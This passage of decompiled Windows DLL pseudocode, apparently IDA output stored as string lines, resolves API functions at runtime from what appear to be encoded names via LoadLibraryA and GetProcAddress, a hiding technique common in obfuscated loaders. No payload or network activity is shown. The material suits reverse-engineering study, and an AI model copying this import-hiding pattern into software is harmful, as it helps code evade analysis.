    "    sub_1000AD50((int)v94, (LPCWCH)v80, v81, v82, v83, (int)v84, (int)v85);",
    "    v20 = v101;",
    "    *(_OWORD *)a1 = 0;",
    "    a1[4] = 0;",
    "    a1[5] = 0;",
    "    v21 = *(_OWORD *)v94;",
    "    LOBYTE(v94[0]) = 0;",
    "    *(_OWORD *)a1 = v21;",
    "    *((_QWORD *)a1 + 2) = v95;",
    "    v95 = 0xF00000000LL;",
    "    if ( v20 > 7 )",
    "    {",
    "      v22 = v99[0];",
    "      v23 = (const CHAR *)(2 * v20 + 2);",
    "      if ( (unsigned int)v23 >= 0x1000 )",
    "      {",
    "        v22 = (void *)*((_DWORD *)v99[0] - 1);",
    "        v23 += 35;",
    "        if ( (unsigned int)((char *)v99[0] - (char *)v22 - 4) > 0x1F )",
    "          goto LABEL_60;",
    "      }",
    "      v85 = v23;",
    "      sub_100154EB(v22);",
    "    }",
    "    if ( v98 > 7 )",
    "    {",
    "      v24 = Block;",
    "      v25 = (const CHAR *)(2 * v98 + 2);",
    "      if ( (unsigned int)v25 >= 0x1000 )",
    "      {",
    "        v24 = (_BYTE *)*((_DWORD *)Block - 1);",
    "        v25 = (const CHAR *)(2 * v98 + 37);",
    "        if ( (unsigned int)((_BYTE *)Block - v24 - 4) > 0x1F )",
    "          goto LABEL_60;",
    "      }",
    "      v85 = v25;",
    "      sub_100154EB(v24);",
    "    }",
    "    v97 = 0;",
    "    v98 = 7;",
    "    LOWORD(Block) = 0;",
    "    if ( v110 > 0xF )",
    "    {",
    "      v26 = (CHAR *)lpLibFileName[0];",
    "      v27 = (const CHAR *)(v110 + 1);",
    "      if ( v110 + 1 >= 0x1000 )",
    "      {",
    "        v26 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "        v27 = (const CHAR *)(v110 + 36);",
    "        if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v26 - 4) > 0x1F )",
    "          goto LABEL_60;",
    "      }",
    "      v85 = v27;",
    "      sub_100154EB(v26);",
    "    }",
    "    v109 = 0;",
    "    v110 = 15;",
    "    LOBYTE(lpLibFileName[0]) = 0;",
    "    if ( v107 > 0xF )",
    "    {",
    "      v28 = (CHAR *)lpProcName[0];",
    "      v29 = (const CHAR *)(v107 + 1);",
    "      if ( v107 + 1 >= 0x1000 )",
    "      {",
    "        v28 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "        v29 = (const CHAR *)(v107 + 36);",
    "        if ( (unsigned int)(lpProcName[0] - (LPCSTR)v28 - 4) > 0x1F )",
    "          goto LABEL_60;",
    "      }",
    "      v85 = v29;",
    "      sub_100154EB(v28);",
    "    }",
    "    v106 = 0;",
    "    v107 = 15;",
    "    LOBYTE(lpProcName[0]) = 0;",
    "    if ( v104 > 7 )",
    "    {",
    "      v30 = (WCHAR *)lpModuleName[0];",
    "      v31 = (const CHAR *)(2 * v104 + 2);",
    "      if ( (unsigned int)v31 >= 0x1000 )",
    "      {",
    "        v30 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "        v31 = (const CHAR *)(2 * v104 + 37);",
    "        if ( (unsigned int)((char *)lpModuleName[0] - (char *)v30 - 4) > 0x1F )",
    "          goto LABEL_60;",
    "      }",
    "      v85 = v31;",
    "      sub_100154EB(v30);",
    "    }",
    "    v103 = 0;",
    "    v104 = 7;",
    "    LOWORD(lpModuleName[0]) = 0;",
    "    if ( v93 <= 0xF )",
    "      return a1;",
    "    v13 = v92[0];",
    "    v14 = (const CHAR *)(v93 + 1);",
    "    if ( v93 + 1 < 0x1000 )",
    "      goto LABEL_27;",
    "    v13 = (void *)*((_DWORD *)v92[0] - 1);",
    "    v14 = (const CHAR *)(v93 + 36);",
    "    if ( (unsigned int)((char *)v92[0] - (char *)v13 - 4) <= 0x1F )",
    "      goto LABEL_27;",
    "LABEL_60:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v85 = 0;",
    "  *(_OWORD *)a1 = 0;",
    "  v84 = &unk_1003B3A1;",
    "  a1[4] = 0;",
    "  a1[5] = 0;",
    "  sub_100018C0(a1, v84, (size_t)v85);",
    "  if ( v98 > 7 )",
    "  {",
    "    v5 = Block;",
    "    v6 = (const CHAR *)(2 * v98 + 2);",
    "    if ( (unsigned int)v6 >= 0x1000 )",
    "    {",
    "      v5 = (_BYTE *)*((_DWORD *)Block - 1);",
    "      v6 = (const CHAR *)(2 * v98 + 37);",
    "      if ( (unsigned int)((_BYTE *)Block - v5 - 4) > 0x1F )",
    "        goto LABEL_60;",
    "    }",
    "    v85 = v6;",
    "    sub_100154EB(v5);",
    "  }",
    "  v97 = 0;",
    "  v98 = 7;",
    "  LOWORD(Block) = 0;",
    "  if ( v110 > 0xF )",
    "  {",
    "    v7 = (CHAR *)lpLibFileName[0];",
    "    v8 = (const CHAR *)(v110 + 1);",
    "    if ( v110 + 1 >= 0x1000 )",
    "    {",
    "      v7 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "      v8 = (const CHAR *)(v110 + 36);",
    "      if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v7 - 4) > 0x1F )",
    "        goto LABEL_60;",
    "    }",
    "    v85 = v8;",
    "    sub_100154EB(v7);",
    "  }",
    "  v109 = 0;",
    "  v110 = 15;",
    "  LOBYTE(lpLibFileName[0]) = 0;",
    "  if ( v107 > 0xF )",
    "  {",
    "    v9 = (CHAR *)lpProcName[0];",
    "    v10 = (const CHAR *)(v107 + 1);",
    "    if ( v107 + 1 >= 0x1000 )",
    "    {",
    "      v9 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "      v10 = (const CHAR *)(v107 + 36);",
    "      if ( (unsigned int)(lpProcName[0] - (LPCSTR)v9 - 4) > 0x1F )",
    "        goto LABEL_60;",
    "    }",
    "    v85 = v10;",
    "    sub_100154EB(v9);",
    "  }",
    "  v106 = 0;",
    "  v107 = 15;",
    "  LOBYTE(lpProcName[0]) = 0;",
    "  if ( v104 > 7 )",
    "  {",
    "    v11 = (WCHAR *)lpModuleName[0];",
    "    v12 = (const CHAR *)(2 * v104 + 2);",
    "    if ( (unsigned int)v12 >= 0x1000 )",
    "    {",
    "      v11 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "      v12 = (const CHAR *)(2 * v104 + 37);",
    "      if ( (unsigned int)((char *)lpModuleName[0] - (char *)v11 - 4) > 0x1F )",
    "        goto LABEL_60;",
    "    }",
    "    v85 = v12;",
    "    sub_100154EB(v11);",
    "  }",
    "  v103 = 0;",
    "  v104 = 7;",
    "  LOWORD(lpModuleName[0]) = 0;",
    "  if ( v93 > 0xF )",
    "  {",
    "    v13 = v92[0];",
    "    v14 = (const CHAR *)(v93 + 1);",
    "    if ( v93 + 1 < 0x1000",
    "      || (v13 = (void *)*((_DWORD *)v92[0] - 1),",
    "          v14 = (const CHAR *)(v93 + 36),",
    "          (unsigned int)((char *)v92[0] - (char *)v13 - 4) <= 0x1F) )",
    "    {",
    "LABEL_27:",
    "      v85 = v14;",
    "      sub_100154EB(v13);",
    "      return a1;",
    "    }",
    "    goto LABEL_60;",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "WCHAR *__stdcall sub_10004100(WCHAR *a1)",
    "{",
    "  WCHAR *v1; // edi",
    "  const CHAR *v2; // ecx",
    "  const WCHAR *v3; // eax",
    "  HMODULE ModuleHandleW; // eax",
    "  const CHAR *v5; // eax",
    "  _BYTE *v6; // edx",
    "  const CHAR *v7; // ecx",
    "  CHAR *v8; // edx",
    "  const CHAR *v9; // ecx",
    "  CHAR *v10; // edx",
    "  const CHAR *v11; // ecx",
    "  WCHAR *v12; // edx",
    "  const CHAR *v13; // ecx",
    "  void *v14; // edx",
    "  const CHAR *v15; // ecx",
    "  void *v16; // edx",
    "  const CHAR *v17; // ecx",
    "  void *v18; // edx",
    "  const CHAR *v19; // ecx",
    "  void *v20; // edx",
    "  const CHAR *v21; // ecx",
    "  void **v22; // eax",
    "  int (__stdcall *v23)(int, void **, _DWORD, int, LPCWCH *); // ecx",
    "  void **v24; // eax",
    "  void **v25; // eax",
    "  int (__stdcall *v26)(LPCWCH, void **, _DWORD, void ***, int, LPCWCH *); // ecx",
    "  void **v27; // eax",
    "  unsigned int v28; // kr00_4",
    "  void **v29; // edi",
    "  _QWORD *v30; // eax",
    "  _BYTE *v31; // edx",
    "  const CHAR *v32; // ecx",
    "  __int128 v33; // xmm0",
    "  void *v34; // edx",
    "  const CHAR *v35; // ecx",
    "  void *v36; // edx",
    "  const CHAR *v37; // ecx",
    "  void *v38; // edx",
    "  const CHAR *v39; // ecx",
    "  void *v40; // edx",
    "  const CHAR *v41; // ecx",
    "  _BYTE *v42; // edx",
    "  const CHAR *v43; // ecx",
    "  CHAR *v44; // edx",
    "  const CHAR *v45; // ecx",
    "  CHAR *v46; // edx",
    "  const CHAR *v47; // ecx",
    "  WCHAR *v48; // edx",
    "  const CHAR *v49; // ecx",
    "  void *v50; // edx",
    "  const CHAR *v51; // ecx",
    "  void *v52; // edx",
    "  const CHAR *v53; // ecx",
    "  void *v54; // edx",
    "  const CHAR *v55; // ecx",
    "  void *v57; // edx",
    "  const CHAR *v58; // ecx",
    "  void *v59; // edx",
    "  const CHAR *v60; // ecx",
    "  void *v61; // edx",
    "  const CHAR *v62; // ecx",
    "  void *v63; // edx",
    "  const CHAR *v64; // ecx",
    "  _BYTE *v65; // edx",
    "  const CHAR *v66; // ecx",
    "  CHAR *v67; // edx",
    "  const CHAR *v68; // ecx",
    "  CHAR *v69; // edx",
    "  const CHAR *v70; // ecx",
    "  WCHAR *v71; // edx",
    "  const CHAR *v72; // ecx",
    "  void *v73; // edx",
    "  const CHAR *v74; // ecx",
    "  void *v75; // edx",
    "  const CHAR *v76; // ecx",
    "  void *v77; // edx",
    "  const CHAR *v78; // ecx",
    "  _BYTE *v79; // edx",
    "  const CHAR *v80; // ecx",
    "  CHAR *v81; // edx",
    "  const CHAR *v82; // ecx",
    "  CHAR *v83; // edx",
    "  const CHAR *v84; // ecx",
    "  WCHAR *v85; // edx",
    "  const CHAR *v86; // ecx",
    "  void *v87; // edx",
    "  const CHAR *v88; // ecx",
    "  void *v89; // edx",
    "  const CHAR *v90; // ecx",
    "  void *v91; // [esp-30h] [ebp-9C4h]",
    "  void *v92; // [esp-30h] [ebp-9C4h]",
    "  void *v93; // [esp-30h] [ebp-9C4h]",
    "  void *v94; // [esp-30h] [ebp-9C4h]",
    "  void *v95; // [esp-30h] [ebp-9C4h]",
    "  void *v96; // [esp-30h] [ebp-9C4h]",
    "  void *v97; // [esp-30h] [ebp-9C4h]",
    "  void *v98; // [esp-30h] [ebp-9C4h]",
    "  void *v99; // [esp-30h] [ebp-9C4h]",
    "  void *v100; // [esp-30h] [ebp-9C4h]",
    "  void *v101; // [esp-30h] [ebp-9C4h]",
    "  void *v102; // [esp-30h] [ebp-9C4h]",
    "  int v103; // [esp-2Ch] [ebp-9C0h]",
    "  int v104; // [esp-2Ch] [ebp-9C0h]",
    "  int v105; // [esp-2Ch] [ebp-9C0h]",
    "  int v106; // [esp-2Ch] [ebp-9C0h]",
    "  int v107; // [esp-2Ch] [ebp-9C0h]",
    "  int v108; // [esp-2Ch] [ebp-9C0h]",
    "  int v109; // [esp-2Ch] [ebp-9C0h]",
    "  int v110; // [esp-2Ch] [ebp-9C0h]",
    "  int v111; // [esp-2Ch] [ebp-9C0h]",
    "  int v112; // [esp-2Ch] [ebp-9C0h]",
    "  int v113; // [esp-2Ch] [ebp-9C0h]",
    "  int v114; // [esp-2Ch] [ebp-9C0h]",
    "  int v115; // [esp-28h] [ebp-9BCh]",
    "  int v116; // [esp-28h] [ebp-9BCh]",
    "  int v117; // [esp-28h] [ebp-9BCh]",
    "  int v118; // [esp-28h] [ebp-9BCh]",
    "  int v119; // [esp-28h] [ebp-9BCh]",
    "  int v120; // [esp-28h] [ebp-9BCh]",
    "  int v121; // [esp-28h] [ebp-9BCh]",
    "  int v122; // [esp-28h] [ebp-9BCh]",
    "  int v123; // [esp-28h] [ebp-9BCh]",
    "  int v124; // [esp-28h] [ebp-9BCh]",
    "  int v125; // [esp-28h] [ebp-9BCh]",
    "  int v126; // [esp-28h] [ebp-9BCh]",
    "  int v127; // [esp-24h] [ebp-9B8h]",
    "  int v128; // [esp-24h] [ebp-9B8h]",
    "  int v129; // [esp-24h] [ebp-9B8h]",
    "  int v130; // [esp-24h] [ebp-9B8h]",
    "  int v131; // [esp-24h] [ebp-9B8h]",
    "  int v132; // [esp-24h] [ebp-9B8h]",
    "  int v133; // [esp-24h] [ebp-9B8h]",
    "  int v134; // [esp-24h] [ebp-9B8h]",
    "  int v135; // [esp-24h] [ebp-9B8h]",
    "  int v136; // [esp-24h] [ebp-9B8h]",
    "  int v137; // [esp-24h] [ebp-9B8h]",
    "  int v138; // [esp-24h] [ebp-9B8h]",
    "  int v139; // [esp-20h] [ebp-9B4h]",
    "  int v140; // [esp-20h] [ebp-9B4h]",
    "  int v141; // [esp-20h] [ebp-9B4h]",
    "  int v142; // [esp-20h] [ebp-9B4h]",
    "  int v143; // [esp-20h] [ebp-9B4h]",
    "  int v144; // [esp-20h] [ebp-9B4h]",
    "  int v145; // [esp-20h] [ebp-9B4h]",
    "  int v146; // [esp-20h] [ebp-9B4h]",
    "  int v147; // [esp-20h] [ebp-9B4h]",
    "  int v148; // [esp-20h] [ebp-9B4h]",
    "  int v149; // [esp-20h] [ebp-9B4h]",
    "  int v150; // [esp-20h] [ebp-9B4h]",
    "  int v151; // [esp-1Ch] [ebp-9B0h]",
    "  int v152; // [esp-1Ch] [ebp-9B0h]",
    "  int v153; // [esp-1Ch] [ebp-9B0h]",
    "  int v154; // [esp-1Ch] [ebp-9B0h]",
    "  int v155; // [esp-1Ch] [ebp-9B0h]",
    "  int v156; // [esp-1Ch] [ebp-9B0h]",
    "  int v157; // [esp-1Ch] [ebp-9B0h]",
    "  int v158; // [esp-1Ch] [ebp-9B0h]",
    "  int v159; // [esp-1Ch] [ebp-9B0h]",
    "  int v160; // [esp-1Ch] [ebp-9B0h]",
    "  int v161; // [esp-1Ch] [ebp-9B0h]",
    "  int v162; // [esp-1Ch] [ebp-9B0h]",
    "  void *v163; // [esp-18h] [ebp-9ACh] BYREF",
    "  int v164; // [esp-14h] [ebp-9A8h]",
    "  int v165; // [esp-10h] [ebp-9A4h]",
    "  void ***v166; // [esp-Ch] [ebp-9A0h]",
    "  int v167; // [esp-8h] [ebp-99Ch]",
    "  LPCWCH *p_lpWideCharStr; // [esp-4h] [ebp-998h]",
    "  int v169; // [esp+0h] [ebp-994h]",
    "  int v170; // [esp+4h] [ebp-990h]",
    "  void *v171; // [esp+Ch] [ebp-988h] BYREF",
    "  unsigned int v172; // [esp+20h] [ebp-974h]",
    "  void **v173; // [esp+28h] [ebp-96Ch]",
    "  FARPROC ProcAddress; // [esp+2Ch] [ebp-968h]",
    "  HMODULE LibraryA; // [esp+30h] [ebp-964h]",
    "  void **v176; // [esp+34h] [ebp-960h]",
    "  int cchWideChar; // [esp+38h] [ebp-95Ch]",
    "  int v178; // [esp+3Ch] [ebp-958h]",
    "  LPCWCH lpWideCharStr; // [esp+40h] [ebp-954h] BYREF",
    "  __int128 v180; // [esp+44h] [ebp-950h] BYREF",
    "  __int64 v181; // [esp+54h] [ebp-940h]",
    "  void *v182[4]; // [esp+5Ch] [ebp-938h] BYREF",
    "  int v183; // [esp+6Ch] [ebp-928h]",
    "  unsigned int v184; // [esp+70h] [ebp-924h]",
    "  void *v185[4]; // [esp+74h] [ebp-920h] BYREF",
    "  unsigned int v186; // [esp+84h] [ebp-910h]",
    "  unsigned int v187; // [esp+88h] [ebp-90Ch]",
    "  void *v188[4]; // [esp+8Ch] [ebp-908h] BYREF",
    "  int v189; // [esp+9Ch] [ebp-8F8h]",
    "  unsigned int v190; // [esp+A0h] [ebp-8F4h]",
    "  void *v191[4]; // [esp+A4h] [ebp-8F0h] BYREF",
    "  int v192; // [esp+B4h] [ebp-8E0h]",
    "  unsigned int v193; // [esp+B8h] [ebp-8DCh]",
    "  void *v194[4]; // [esp+BCh] [ebp-8D8h] BYREF",
    "  int v195; // [esp+CCh] [ebp-8C8h]",
    "  unsigned int v196; // [esp+D0h] [ebp-8C4h]",
    "  void *Block; // [esp+D4h] [ebp-8C0h] BYREF",
    "  int v198; // [esp+E4h] [ebp-8B0h]",
    "  unsigned int v199; // [esp+E8h] [ebp-8ACh]",
    "  void *v200[4]; // [esp+ECh] [ebp-8A8h] BYREF",
    "  int v201; // [esp+FCh] [ebp-898h]",
    "  unsigned int v202; // [esp+100h] [ebp-894h]",
    "  void *v203[4]; // [esp+104h] [ebp-890h] BYREF",
    "  int v204; // [esp+114h] [ebp-880h]",
    "  unsigned int v205; // [esp+118h] [ebp-87Ch]",
    "  void *v206[4]; // [esp+11Ch] [ebp-878h] BYREF",
    "  int v207; // [esp+12Ch] [ebp-868h]",
    "  unsigned int v208; // [esp+130h] [ebp-864h]",
    "  LPCWSTR lpModuleName[4]; // [esp+134h] [ebp-860h] BYREF",
    "  int v210; // [esp+144h] [ebp-850h]",
    "  unsigned int v211; // [esp+148h] [ebp-84Ch]",
    "  LPCSTR lpProcName[4]; // [esp+14Ch] [ebp-848h] BYREF",
    "  int v213; // [esp+15Ch] [ebp-838h]",
    "  unsigned int v214; // [esp+160h] [ebp-834h]",
    "  LPCSTR lpLibFileName[4]; // [esp+164h] [ebp-830h] BYREF",
    "  int v216; // [esp+174h] [ebp-820h]",
    "  unsigned int v217; // [esp+178h] [ebp-81Ch]",
    "  int v218; // [esp+17Ch] [ebp-818h] BYREF",
    "  void **v219; // [esp+180h] [ebp-814h] BYREF",
    "  unsigned __int16 Src[1024]; // [esp+184h] [ebp-810h] BYREF",
    "  int v221; // [esp+990h] [ebp-4h]",
    "",
    "  v1 = a1;",
    "  lpWideCharStr = a1;",
    "  cchWideChar = (int)a1;",
    "  *(_OWORD *)v185 = 0;",
    "  v186 = 0;",
    "  v187 = 0;",
    "  sub_1000A170(v185, &unk_1003B3C4, 0);",
    "  v221 = 1;",
    "  v180 = 0;",
    "  v181 = 0xF00000000LL;",
    "  LOBYTE(v180) = 0;",
    "  sub_1000A970(v169, v170);",
    "  v178 = sub_10002FE0();",
    "  sub_10009E70(v178 + 1008);",
    "  sub_1000B000(v200, v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "  LOBYTE(v221) = 2;",
    "  sub_10009E70(v200);",
    "  sub_1000AA30((int)v206, (LPCCH)v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "  LOBYTE(v221) = 3;",
    "  v219 = &v163;",
    "  sub_10009E70(v178);",
    "  sub_1000B000(&v163, v91, v103, v115, v127, v139, v151);",
    "  LOBYTE(v221) = 4;",
    "  sub_10009E70(v178 + 744);",
    "  LOBYTE(v221) = 3;",
    "  sub_1000B970((int)v203, v92, v104, v116, v128, v140, v152, v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "  LOBYTE(v221) = 5;",
    "  sub_10009E70(v203);",
    "  sub_1000AA30((int)lpModuleName, (LPCCH)v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "  LOBYTE(v221) = 6;",
    "  v219 = &v163;",
    "  sub_10009E70(v178 + 24);",
    "  sub_1000B000(&v163, v93, v105, v117, v129, v141, v153);",
    "  LOBYTE(v221) = 7;",
    "  sub_10009E70(v178 + 768);",
    "  LOBYTE(v221) = 6;",
    "  sub_1000B970(",
    "    (int)lpProcName,",
    "    v94,",
    "    v106,",
    "    v118,",
    "    v130,",
    "    v142,",
    "    v154,",
    "    v163,",
    "    v164,",
    "    v165,",
    "    (int)v166,",
    "    v167,",
    "    (int)p_lpWideCharStr);",
    "  LOBYTE(v221) = 8;",
    "  v219 = &v163;",
    "  sub_10009E70(v178 + 216);",
    "  sub_1000B000(&v163, v95, v107, v119, v131, v143, v155);",
    "  LOBYTE(v221) = 9;",
    "  sub_10009E70(v178 + 960);",
    "  LOBYTE(v221) = 8;",
    "  sub_1000B970(",
    "    (int)lpLibFileName,",
    "    v96,",
    "    v108,",
    "    v120,",
    "    v132,",
    "    v144,",
    "    v156,",
    "    v163,",
    "    v164,",
    "    v165,",
    "    (int)v166,",
    "    v167,",
    "    (int)p_lpWideCharStr);",
    "  LOBYTE(v221) = 10;",
    "  sub_10009E70(lpLibFileName);",
    "  sub_1000AA30((int)&Block, (LPCCH)v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "  LOBYTE(v221) = 11;",
    "  v2 = (const CHAR *)lpProcName;",
    "  v3 = (const WCHAR *)lpModuleName;",
    "  if ( v214 > 0xF )",
    "    v2 = lpProcName[0];",
    "  p_lpWideCharStr = (LPCWCH *)v2;",
    "  if ( v211 > 7 )",
    "    v3 = lpModuleName[0];",
    "  ModuleHandleW = GetModuleHandleW(v3);",
    "  ProcAddress = GetProcAddress(ModuleHandleW, (LPCSTR)p_lpWideCharStr);",
    "  v5 = (const CHAR *)lpLibFileName;",
    "  if ( v217 > 0xF )",
    "    v5 = lpLibFileName[0];",
    "  LibraryA = LoadLibraryA(v5);",
    "  if ( !LibraryA )",
    "  {",
    "    p_lpWideCharStr = 0;",
    "    *(_OWORD *)a1 = 0;",
    "    v167 = (int)&unk_1003B3A1;",
    "    *((_DWORD *)a1 + 4) = 0;",
    "    *((_DWORD *)a1 + 5) = 0;",
    "    sub_100018C0(a1, (void *)v167, (size_t)p_lpWideCharStr);",
    "    if ( v199 > 7 )",
    "    {",
    "      v6 = Block;",
    "      v7 = (const CHAR *)(2 * v199 + 2);",
    "      if ( (unsigned int)v7 >= 0x1000 )",
    "      {",
    "        v6 = (_BYTE *)*((_DWORD *)Block - 1);",
    "        v7 = (const CHAR *)(2 * v199 + 37);",
    "        if ( (unsigned int)((_BYTE *)Block - v6 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v7;",
    "      sub_100154EB(v6);",
    "    }",
    "    v198 = 0;",
    "    v199 = 7;",
    "    LOWORD(Block) = 0;",
    "    if ( v217 > 0xF )",
    "    {",
    "      v8 = (CHAR *)lpLibFileName[0];",
    "      v9 = (const CHAR *)(v217 + 1);",
    "      if ( v217 + 1 >= 0x1000 )",
    "      {",
    "        v8 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "        v9 = (const CHAR *)(v217 + 36);",
    "        if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v8 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v9;",
    "      sub_100154EB(v8);",
    "    }",
    "    v216 = 0;",
    "    v217 = 15;",
    "    LOBYTE(lpLibFileName[0]) = 0;",
    "    if ( v214 > 0xF )",
    "    {",
    "      v10 = (CHAR *)lpProcName[0];",
    "      v11 = (const CHAR *)(v214 + 1);",
    "      if ( v214 + 1 >= 0x1000 )",
    "      {",
    "        v10 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "        v11 = (const CHAR *)(v214 + 36);",
    "        if ( (unsigned int)(lpProcName[0] - (LPCSTR)v10 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v11;",
    "      sub_100154EB(v10);",
    "    }",
    "    v213 = 0;",
    "    v214 = 15;",
    "    LOBYTE(lpProcName[0]) = 0;",
    "    if ( v211 > 7 )",
    "    {",
    "      v12 = (WCHAR *)lpModuleName[0];",
    "      v13 = (const CHAR *)(2 * v211 + 2);",
    "      if ( (unsigned int)v13 >= 0x1000 )",
    "      {",
    "        v12 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "        v13 = (const CHAR *)(2 * v211 + 37);",
    "        if ( (unsigned int)((char *)lpModuleName[0] - (char *)v12 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v13;",
    "      sub_100154EB(v12);",
    "    }",
    "    v210 = 0;",
    "    v211 = 7;",
    "    LOWORD(lpModuleName[0]) = 0;",
    "    if ( v205 > 0xF )",
    "    {",
    "      v14 = v203[0];",
    "      v15 = (const CHAR *)(v205 + 1);",
    "      if ( v205 + 1 >= 0x1000 )",
    "      {",
    "        v14 = (void *)*((_DWORD *)v203[0] - 1);",
    "        v15 = (const CHAR *)(v205 + 36);",
    "        if ( (unsigned int)((char *)v203[0] - (char *)v14 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v15;",
    "      sub_100154EB(v14);",
    "    }",
    "    v204 = 0;",
    "    v205 = 15;",
    "    LOBYTE(v203[0]) = 0;",
    "    if ( v208 > 7 )",
    "    {",
    "      v16 = v206[0];",
    "      v17 = (const CHAR *)(2 * v208 + 2);",
    "      if ( (unsigned int)v17 >= 0x1000 )",
    "      {",
    "        v16 = (void *)*((_DWORD *)v206[0] - 1);",
    "        v17 = (const CHAR *)(2 * v208 + 37);",
    "        if ( (unsigned int)((char *)v206[0] - (char *)v16 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v17;",
    "      sub_100154EB(v16);",
    "    }",
    "    v207 = 0;",
    "    v208 = 7;",
    "    LOWORD(v206[0]) = 0;",
    "    if ( v202 > 0xF )",
    "    {",
    "      v18 = v200[0];",
    "      v19 = (const CHAR *)(v202 + 1);",
    "      if ( v202 + 1 >= 0x1000 )",
    "      {",
    "        v18 = (void *)*((_DWORD *)v200[0] - 1);",
    "        v19 = (const CHAR *)(v202 + 36);",
    "        if ( (unsigned int)((char *)v200[0] - (char *)v18 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "LABEL_35:",
    "      p_lpWideCharStr = (LPCWCH *)v19;",
    "      sub_100154EB(v18);",
    "      goto LABEL_36;",
    "    }",
    "    goto LABEL_36;",
    "  }",
    "  v219 = &v163;",
    "  sub_10009E70(v178 + 264);",
    "  sub_1000B000(&v163, v97, v109, v121, v133, v145, v157);",
    "  LOBYTE(v221) = 12;",
    "  sub_10009E70(v178 + 1032);",
    "  LOBYTE(v221) = 11;",
    "  sub_1000B970((int)v194, v98, v110, v122, v134, v146, v158, v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "  LOBYTE(v221) = 13;",
    "  v22 = v194;",
    "  if ( v196 > 0xF )",
    "    v22 = (void **)v194[0];",
    "  v23 = (int (__stdcall *)(int, void **, _DWORD, int, LPCWCH *))((int (__stdcall *)(HMODULE, void **))ProcAddress)(",
    "                                                                  LibraryA,",
    "                                                                  v22);",
    "  if ( !v23 )",
    "  {",
    "    p_lpWideCharStr = 0;",
    "    *(_OWORD *)a1 = 0;",
    "    v167 = (int)&unk_1003B3A1;",
    "    *((_DWORD *)a1 + 4) = 0;",
    "    *((_DWORD *)a1 + 5) = 0;",
    "    sub_100018C0(a1, (void *)v167, (size_t)p_lpWideCharStr);",
    "    if ( v196 > 0xF )",
    "    {",
    "      v77 = v194[0];",
    "      v78 = (const CHAR *)(v196 + 1);",
    "      if ( v196 + 1 >= 0x1000 )",
    "      {",
    "        v77 = (void *)*((_DWORD *)v194[0] - 1);",
    "        v78 = (const CHAR *)(v196 + 36);",
    "        if ( (unsigned int)((char *)v194[0] - (char *)v77 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v78;",
    "      sub_100154EB(v77);",
    "    }",
    "    v195 = 0;",
    "    v196 = 15;",
    "    LOBYTE(v194[0]) = 0;",
    "    if ( v199 > 7 )",
    "    {",
    "      v79 = Block;",
    "      v80 = (const CHAR *)(2 * v199 + 2);",
    "      if ( (unsigned int)v80 >= 0x1000 )",
    "      {",
    "        v79 = (_BYTE *)*((_DWORD *)Block - 1);",
    "        v80 = (const CHAR *)(2 * v199 + 37);",
    "        if ( (unsigned int)((_BYTE *)Block - v79 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v80;",
    "      sub_100154EB(v79);",
    "    }",
    "    v198 = 0;",
    "    v199 = 7;",
    "    LOWORD(Block) = 0;",
    "    if ( v217 > 0xF )",
    "    {",
    "      v81 = (CHAR *)lpLibFileName[0];",
    "      v82 = (const CHAR *)(v217 + 1);",
    "      if ( v217 + 1 >= 0x1000 )",
    "      {",
    "        v81 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "        v82 = (const CHAR *)(v217 + 36);",
    "        if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v81 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v82;",
    "      sub_100154EB(v81);",
    "    }",
    "    v216 = 0;",
    "    v217 = 15;",
    "    LOBYTE(lpLibFileName[0]) = 0;",
    "    if ( v214 > 0xF )",
    "    {",
    "      v83 = (CHAR *)lpProcName[0];",
    "      v84 = (const CHAR *)(v214 + 1);",
    "      if ( v214 + 1 >= 0x1000 )",
    "      {",
    "        v83 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "        v84 = (const CHAR *)(v214 + 36);",
    "        if ( (unsigned int)(lpProcName[0] - (LPCSTR)v83 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v84;",
    "      sub_100154EB(v83);",
    "    }",
    "    v213 = 0;",
    "    v214 = 15;",
    "    LOBYTE(lpProcName[0]) = 0;",
    "    if ( v211 > 7 )",
    "    {",
    "      v85 = (WCHAR *)lpModuleName[0];",
    "      v86 = (const CHAR *)(2 * v211 + 2);",
